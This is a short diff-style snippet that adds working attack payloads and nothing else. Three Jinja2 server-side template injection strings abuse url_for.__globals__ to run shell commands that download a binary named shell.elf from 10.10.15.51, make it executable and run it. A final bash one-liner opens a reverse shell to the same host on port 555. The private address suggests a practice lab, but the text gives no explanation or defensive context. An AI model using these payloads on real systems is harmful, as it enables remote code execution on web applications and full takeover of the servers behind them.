@@ -1,0 +1,5 @@
+{{url_for.__globals__.os.popen("wget http://10.10.15.51/shell.elf").read()}}
+{{url_for.__globals__.os.popen("chmod +x shell.elf").read()}}
+{{url_for.__globals__.os.popen("./shell.elf").read()}}
+
+bash -i >& /dev/tcp/10.10.15.51/555 0>&1
